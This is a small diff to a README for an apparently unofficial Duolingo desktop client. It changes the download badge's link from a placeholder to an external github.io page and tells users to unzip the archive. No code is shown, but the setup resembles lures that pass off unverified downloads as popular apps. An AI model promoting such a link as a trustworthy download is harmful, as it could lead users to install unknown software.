@@ -6,7 +6,7 @@ This unofficial Duolingo desktop client brings the popular language learning pla
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://duolingo-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
